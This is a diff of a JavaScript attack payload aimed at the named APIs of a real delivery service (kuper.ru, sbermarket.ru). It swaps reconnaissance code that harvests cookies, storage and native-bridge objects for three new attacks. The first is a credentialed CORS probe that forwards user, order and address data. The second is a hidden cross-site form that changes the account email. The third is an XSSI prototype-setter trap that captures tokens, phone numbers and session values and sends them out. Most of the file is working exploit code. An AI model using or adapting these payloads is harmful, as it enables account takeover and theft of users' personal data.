@@ -10,55 +10,127 @@ function send(path, data) {
     }
 }
 
-(function recon() {
-    var d = {};
-    d.origin = String(location.origin);
-    d.href = String(location.href);
-    d.ua = String(navigator.userAgent);
+(function corsCheck() {
+    var endpoints = [
+        'https://api.kuper.ru/v2/user',
+        'https://api.kuper.ru/v2/app_lt_configuration',
+        'https://api.kuper.ru/v2/orders',
+        'https://api.kuper.ru/v2/user/addresses',
+        'https://api.kuper.ru/v2/cart',
+        'https://stf-gw.kuper.ru/',
+        'https://rs.kuper.ru/',
+        'https://kuper.ru/',
+        'https://sbermarket.ru/',
+        'https://scanpay.sbermarket.ru/',
+        'https://landings.sbermarket.ru/'
+    ];
 
-    // document.cookie — SecurityError в null origin!
-    try { d.cookie = document.cookie; } catch(e) { d.cookieErr = e.message; }
-
-    // localStorage — тоже SecurityError
-    try { d.lsLen = localStorage.length; } catch(e) { d.lsErr = e.message; }
-
-    // sessionStorage
-    try { d.ssLen = sessionStorage.length; } catch(e) { d.ssErr = e.message; }
-
-    // indexedDB
-    try {
-        indexedDB.databases().then(function(dbs) {
-            d.idb = dbs;
-            send('recon-idb', d);
-        }).catch(function(e) { d.idbErr = e.message; });
-    } catch(e) { d.idbErr2 = e.message; }
-
-    // JS Bridge
-    try { d.bridgeKeys = Object.keys(window.ReactNativeWebView); } catch(e) { d.bridgeErr = e.message; }
-    try { d.bridgeJson = window.ReactNativeWebView.injectedObjectJson(); } catch(e) { d.bjErr = e.message; }
-    try { d.landingConstructor = window.ReactNativeWebView.landingConstructor; } catch(e) {}
-
-    // Window scan для RN/native объектов
-    try {
-        d.specialKeys = [];
-        for (var k in window) {
+    endpoints.forEach(function(ep, i) {
+        setTimeout(function() {
             try {
-                if (k.indexOf('React') > -1 || k.indexOf('__') > -1 ||
-                    k.indexOf('native') > -1 || k.indexOf('webkit') > -1 ||
-                    k.indexOf('chrome') > -1 || k.indexOf('Android') > -1) {
-                    d.specialKeys.push(k + ':' + typeof window[k]);
-                }
+                fetch(ep, { credentials: 'include' })
+                    .then(function(r) {
+                        var info = {
+                            url: ep,
+                            status: r.status,
+                            type: r.type, // 'cors', 'opaque', 'basic'
+                            acao: r.headers.get('access-control-allow-origin'),
+                            acac: r.headers.get('access-control-allow-credentials')
+                        };
+                        // Если type !== 'opaque', значит CORS разрешён!
+                        if (r.type !== 'opaque') {
+                            r.text().then(function(body) {
+                                info.body = body.substring(0, 3000);
+                                send('cors-HIT-' + i, info);
+                            });
+                        } else {
+                            send('cors-blocked-' + i, info);
+                        }
+                    })
+                    .catch(function(e) {
+                        send('cors-err-' + i, { url: ep, err: e.message });
+                    });
             } catch(e) {}
+        }, i * 300);
+    });
+})();
+
+
+
+(function csrfForms() {
+    setTimeout(function() {
+        try {
+            // Создаём iframe для сбора результата
+            var ifr = document.createElement('iframe');
+            ifr.name = 'csrf_sink';
+            ifr.style.display = 'none';
+            document.body.appendChild(ifr);
+
+            // Попытка 1: POST form-urlencoded к API
+            var f1 = document.createElement('form');
+            f1.method = 'POST';
+            f1.action = 'https://api.kuper.ru/v2/user';
+            f1.target = 'csrf_sink';
+            f1.enctype = 'application/x-www-form-urlencoded';
+
+            var inp = document.createElement('input');
+            inp.type = 'hidden';
+            inp.name = 'email';
+            inp.value = 'security-test@test.com';
+            f1.appendChild(inp);
+            document.body.appendChild(f1);
+            f1.submit();
+
+            send('csrf-form-sent', { target: 'api.kuper.ru/v2/user', method: 'POST' });
+        } catch(e) {
+            send('csrf-err', { err: e.message });
         }
-    } catch(e) { d.winScanErr = e.message; }
+    }, 4000);
+})();
 
-    // caches API
-    try {
-        caches.keys().then(function(k) {
-            d.cacheKeys = k;
-            send('recon-cache', d);
-        }).catch(function(e) { d.cacheErr = e.message; });
-    } catch(e) { d.cacheErr2 = e.message; }
 
-    send('recon', d);
+
+(function xssi() {
+    setTimeout(function() {
+        try {
+            // Ловушки для перехвата JSON-данных
+            var stolen = [];
+            var fields = ['id','email','phone','name','first_name','last_name',
+                          'address','token','access_token','session'];
+
+            fields.forEach(function(field) {
+                try {
+                    Object.defineProperty(Object.prototype, field, {
+                        set: function(v) {
+                            stolen.push(field + '=' + String(v));
+                            send('xssi-field', { field: field, value: String(v) });
+                        },
+                        get: function() { return undefined; },
+                        configurable: true
+                    });
+                } catch(e) {}
+            });
+
+            // Загружаем API через script tag
+            var urls = [
+                'https://api.kuper.ru/v2/user',
+                'https://api.kuper.ru/v2/app_lt_configuration',
+                'https://api.kuper.ru/v2/user/addresses'
+            ];
+
+            urls.forEach(function(url, i) {
+                var s = document.createElement('script');
+                s.src = url;
+                s.onload = function() {
+                    send('xssi-loaded-' + i, { url: url, stolen: stolen });
+                };
+                s.onerror = function() {
+                    send('xssi-err-' + i, { url: url, stolen: stolen });
+                };
+                document.body.appendChild(s);
+            });
+        } catch(e) {
+            send('xssi-outer-err', { err: e.message });
+        }
+    }, 5000);
 })();
